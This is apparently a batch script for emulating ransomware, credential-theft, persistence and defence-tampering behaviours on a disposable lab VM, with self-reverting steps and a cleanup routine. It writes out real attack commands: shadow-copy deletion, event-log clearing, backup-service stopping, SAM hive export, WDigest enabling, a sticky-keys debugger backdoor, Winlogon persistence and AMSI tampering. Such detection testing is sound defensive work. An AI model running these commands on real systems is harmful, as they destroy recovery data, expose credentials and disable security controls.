@echo off
rem Benign command-line emulations for the disposable Kestrel lab VM (run as administrator).
rem Batch files are not AMSI-scanned, so Defender does not block the *script*; Defender may still
rem block a step's behaviour, which is itself a useful observation. NEVER run on a real machine.
rem Usage: emulate-cmd.cmd <ID>    (called by emulate.ps1)
setlocal
set ID=%1
if "%ID%"=="RW-01" ( vssadmin.exe delete shadows /all /quiet & goto :eof )
if "%ID%"=="RW-02" ( bcdedit /set {default} recoveryenabled no & timeout /t 2 >nul & bcdedit /set {default} recoveryenabled yes & goto :eof )
if "%ID%"=="RW-04" ( wevtutil cl "Windows PowerShell" & goto :eof )
if "%ID%"=="RW-05" ( for %%s in (MSSQLSERVER SQLWriter VeeamBackupSvc memtas mepocs BackupExecVSSProvider) do ( sc.exe stop %%s ) ) & if "%ID%"=="RW-05" goto :eof
if "%ID%"=="CD-01" goto cd01
if "%ID%"=="CD-07" ( reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe" /v ReportingMode /t REG_DWORD /d 2 /f & timeout /t 3 >nul & reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe" /f & goto :eof )
if "%ID%"=="CD-10" ( reg save HKLM\SAM C:\kestrel-lab\sam.hiv /y & timeout /t 1 >nul & del C:\kestrel-lab\sam.hiv & goto :eof )
if "%ID%"=="CD-12" ( reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f & goto :eof )
if "%ID%"=="PS-05" ( schtasks /create /tn KestrelLab /tr "C:\Users\employee\AppData\Local\KestrelLab\kestrel-unsigned.exe" /sc onlogon /ru employee /f & goto :eof )
if "%ID%"=="PS-07" ( copy /y "C:\Users\employee\AppData\Local\KestrelLab\kestrel-unsigned.exe" C:\Users\Public\kestrel-svc.exe >nul & sc.exe create KestrelLabSvc binPath= C:\Users\Public\kestrel-svc.exe start= demand & goto :eof )
if "%ID%"=="PS-09" ( reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f & goto :eof )
if "%ID%"=="PS-10" ( reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Users\employee\AppData\Local\KestrelLab\kestrel-unsigned.exe," /f & goto :eof )
if "%ID%"=="TP-01" ( logman stop Kestrel-IO -ets & goto :eof )
if "%ID%"=="TP-03" ( reg add HKLM\SOFTWARE\Microsoft\AMSI /v FeatureBits /t REG_DWORD /d 2 /f & timeout /t 5 >nul & reg delete HKLM\SOFTWARE\Microsoft\AMSI /v FeatureBits /f & goto :eof )
if "%ID%"=="TP-04" ( reg add HKLM\SYSTEM\CurrentControlSet\Services\KestrelAgent /v LabTest /t REG_SZ /d x /f & timeout /t 5 >nul & reg delete HKLM\SYSTEM\CurrentControlSet\Services\KestrelAgent /v LabTest /f & goto :eof )
if "%ID%"=="cleanup" goto cleanup
echo unknown id %ID%
exit /b 2

:cd01
rem MiniDump of notepad (not lsass): exercises the comsvcs command-line branch only.
start "" notepad.exe
timeout /t 2 >nul
for /f "tokens=2 delims=," %%p in ('tasklist /fi "imagename eq notepad.exe" /fo csv /nh') do set NP=%%~p
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump %NP% C:\kestrel-lab\notepad.dmp full
timeout /t 2 >nul
taskkill /f /im notepad.exe >nul 2>&1
del C:\kestrel-lab\notepad.dmp >nul 2>&1
goto :eof

:cleanup
schtasks /delete /tn KestrelLab /f >nul 2>&1
sc.exe delete KestrelLabSvc >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 0 /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe," /f >nul
bcdedit /set {default} recoveryenabled yes >nul
del C:\kestrel-lab\*.hiv C:\kestrel-lab\*.dmp >nul 2>&1
goto :eof
